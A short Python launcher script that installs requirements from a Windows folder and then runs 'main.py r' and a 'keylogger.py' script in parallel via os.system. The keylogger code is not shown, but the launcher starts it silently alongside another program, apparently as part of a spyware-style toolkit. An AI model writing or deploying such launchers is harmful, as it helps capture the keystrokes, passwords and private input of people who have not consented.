import os
import concurrent.futures

def runComm(comm):
	os.system(comm)

if __name__ == "__main__":
	runComm("pip3 install -r .\\Win\\requirements.txt")
	comms = ["python3 main.py r", "python3 keylogger.py"]
	with concurrent.futures.ProcessPoolExecutor() as executor:
		executor.map(runComm, comms)
